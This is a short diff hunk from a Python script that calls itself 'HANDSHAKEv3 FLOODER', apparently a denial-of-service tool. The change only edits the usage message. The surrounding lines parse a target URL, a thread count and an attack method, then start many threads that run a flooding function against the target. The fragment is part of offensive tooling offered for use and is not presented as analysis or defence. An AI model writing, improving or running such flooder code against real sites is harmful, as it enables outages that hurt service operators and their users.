@@ -33,7 +33,7 @@ if len(sys.argv) == 4:
    thread = int(sys.argv[2])
    meth = sys.argv[3]
 else:
- print(f'WELCOME TO HANDSHAKEv3 FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHODS>')
+ print(f'WELCOME TO HANDSHAKEv3 FLOODER\n{sys.argv[0]} <URL> <THREAD> <METHODS>')
 target = get_target(url)
 for _ in range(int(thread)):
    for _ in range(10):threading.Thread(target=Rapid,args=(target,meth)).start()
